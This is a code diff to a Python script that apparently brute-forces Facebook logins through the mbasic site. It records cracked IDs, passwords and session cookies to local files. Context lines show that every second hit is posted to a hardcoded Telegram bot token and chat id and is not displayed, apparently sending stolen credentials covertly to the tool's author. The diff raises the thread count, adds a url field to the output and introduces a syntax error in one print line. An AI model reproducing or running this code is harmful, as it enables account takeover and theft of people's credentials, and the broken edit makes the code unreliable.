@@ -1129,7 +1129,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=50) as SUMON_xd:
+    with ThreadPool(max_workers=70) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1794,16 +1794,16 @@ def mbasic(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}|{url}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
+                           statusok = (f"{cid}|{pw}|{coki}|{url}")
                            requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw}|{url} ")
                            print(f" {green}Cookie : {green}{coki}")
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
@@ -1812,7 +1812,7 @@ def mbasic(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'|'+url' \33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
